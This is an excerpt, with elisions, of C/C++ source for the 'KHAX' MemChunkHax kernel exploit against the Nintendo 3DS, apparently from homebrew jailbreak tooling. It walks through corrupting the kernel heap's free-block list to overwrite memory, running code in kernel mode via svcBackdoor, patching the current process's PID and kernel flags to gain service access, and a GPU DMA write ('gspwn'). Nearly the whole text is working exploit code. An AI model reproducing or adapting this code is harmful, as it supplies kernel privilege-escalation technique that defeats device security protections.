...
Result __srvRegisterClient(Handle handle)
{
	Result rc = 0;
...
Result __srvGetServiceHandle(Handle srv, Handle* out, const char* name)
{
	Result rc = 0;
	...
	if((rc = svcSendSyncRequest(srv)))return rc;
...
Result KHAX::MemChunkHax::Step2_AllocateMemory()
{
	...
	// SVC ACL layout
	// 00 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF  <--  svc7B bit is bit3 in FF
	//                                        nn nn 08 nn
	//
	// need to free the page at address 0x14080000
	// -> start at 0x14070000
	...
	Result result = svcControlMemory(&address, 0, 0, (sizeof(OverwriteMemory)+0xFFF)&~0xFFF, MEMOP_ALLOC_LINEAR,
	...
	m_overwriteMemory = reinterpret_cast<OverwriteMemory *>(CN_GSPHEAP+0x00080000);
	...
	/*result = svcControlMemory(&address, 0, 0, (sizeof(*m_extraLinear)+0xFFF)&~0xFFF, MEMOP_ALLOC_LINEAR,
		static_cast<MemPerm>(MEMPERM_READ | MEMPERM_WRITE));
	if (result)
	{
	...
	m_extraLinear = reinterpret_cast<ExtraLinearMemory *>(CN_GSPHEAP);
...
Result KHAX::MemChunkHax::Step5_CorruptCreateThread()
{
	...
	dbgcolor(0); // makes shit actually work, for some reason
	u32 tid = 0;
	//svcGetThreadId(&tid, (Handle)0xFFFF8000);
	//u32 writeaddr = 0xFF401F38 + ((tid-14) * 0x2000) + 0xD - 8;
	...
	m_extraLinear->m_freeBlock.m_next = reinterpret_cast<HeapFreeBlock *>(writeaddr);
...
Result KHAX::MemChunkHax::Step6_ExecuteSVCCode()
{
	...
	svcBackdoor(Step6a_SVCEntryPointThunk);
...
Result KHAX::MemChunkHax::Step6a_SVCEntryPointThunk()
{
	...
	s_instance->Step6b_SVCEntryPoint();
	register Result result __asm__("r0") = 0;
...
Result KHAX::MemChunkHax::Step7_GrantServiceAccess()
{
	...
	svcConnectToPort(srvHandle, "srv:");
	__srvRegisterClient(*srvHandle);
...
Result KHAX::MemChunkHax::Step7a_PatchPID()
{
	...
	*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr)
	...
	//u32 kernelflags = *(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr).m_kernelFlags);
	//kernelflags = (kernelflags & 0xFFFFF0FF) | 0x00000300;
	//*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr).m_kernelFlags) = kernelflags;
	return 0;
}
...
KHAX::MemChunkHax::~MemChunkHax()
{
	...
	// reallocate shit, to be safe
	svcControlMemory(&dummy, 0, 0, 0x6000, MEMOP_ALLOC_LINEAR, static_cast<MemPerm>(MEMPERM_READ|MEMPERM_WRITE));

	// Free the extra linear memory.
	/*if (m_extraLinear)
	{
		u32 crapo;
		svcControlMemory(&crapo, (u32)m_extraLinear, 0, sizeof(*m_extraLinear), MEMOP_FREE, (MemPerm)0);
	}*/
...
Result __APT_CheckNew3DS(u8 *out)
{
	Result ret=0;
	...
	Handle apthandle;
	ret = __srvGetServiceHandle(srvHandle, &apthandle, "APT:U");
	if (ret) return ret;
...
Result KHAX::IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown)
{
	...
	if (kernelVersion >= SYSTEM_VERSION(2, 44, 6))
	{
		...
		// crash the system.
		u8 isNew3DS = 0;
		if (Result error = __APT_CheckNew3DS(&isNew3DS))
		{
			*answer = false;
			return error;
		}
...
{
	//Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(Result(*)(Handle*,Handle,u32*,u32))(void*)CN_GSPGPU_FlushDataCache_ADR;
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	
	// flush caches
	GSPGPU_FlushDataCache(gspHandle, (u32*)src, size);
	GSPGPU_InvalidateDataCache(gspHandle, (u32*)dest, size);
	
	// CN gspwn
	doGspwn((u32*)src, (u32*)dest, (u32)size);
